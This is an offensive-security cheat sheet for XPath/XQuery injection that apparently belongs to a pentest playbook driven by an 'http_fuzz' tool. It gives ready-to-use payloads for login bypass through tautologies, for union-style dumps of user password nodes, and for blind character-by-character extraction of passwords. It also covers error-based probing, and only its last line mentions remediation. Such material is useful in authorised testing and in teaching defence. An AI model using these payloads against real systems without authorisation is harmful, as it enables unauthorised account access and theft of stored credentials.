# XPath / XQuery injection

When credentials or lookups are checked against an XML document via XPath
(`//user[name/text()='X' and password/text()='Y']`), unsanitised input breaks out
of the string just like SQLi — but there is no privilege model, so the whole
document is readable.

## Auth bypass
In the username or password field (or the raw XML/JSON param feeding the query):
```
' or '1'='1
' or ''='
admin' or '1'='1
x' or 1=1 or 'x'='y
' or name()='user' or '
']|//*|//user['            (tautology / node flood)
```
Success = you are logged in / the query returns rows it should not. Drive the whole
set in one `http_fuzz` (put `FUZZ` in the field, `payloads:[...]` above) and watch
for the authenticated differential — status/length/redirect vs a known-bad login.

## Direct dump when the result set is rendered (not blind)
If the page lists/echoes whatever the query matches (a search box backed by
XPath), skip the char-by-char loop: union extra nodes into the result set with
`|` so they render alongside the legitimate match:
```
']|//user/password|//user['                             dumps password/all nodes
' or //user[position()>0] or '                          forces every record out
```
Confirm by reading the rendered listing (not a boolean) for the injected nodes'
values — the non-blind sibling of `40`'s boolean technique; fall back to
per-character blind extraction (`45`) only when nothing is reflected.

## Blind boolean extraction
No error, no dump? Enumerate one char at a time against a true/false oracle (login
succeeds / a record appears), all via `http_fuzz` differentials:
```
' and string-length(name(/*[1]))=6 and 'a'='a          root element name length
' and substring(name(/*[1]),1,1)='u' and 'a'='a        its first char
' and substring(//user[1]/password,1,1)='a' and ''='   first password char
' and count(//user)=3 and 'a'='a                       how many users
```
Iterate charset × position; the value that flips the oracle is the real char.

## Error-based
Some engines leak structure in errors — send a lone `'` and read the response; a
raw XPath error names the query. Function tricks (`' or count(/child::*)`) can dump
node counts.

Evidence: a logged-in session you should not have, or extracted node/attribute
values in the response. Remediation: parameterised / precompiled XPath, and reject
or escape quotes in user input.
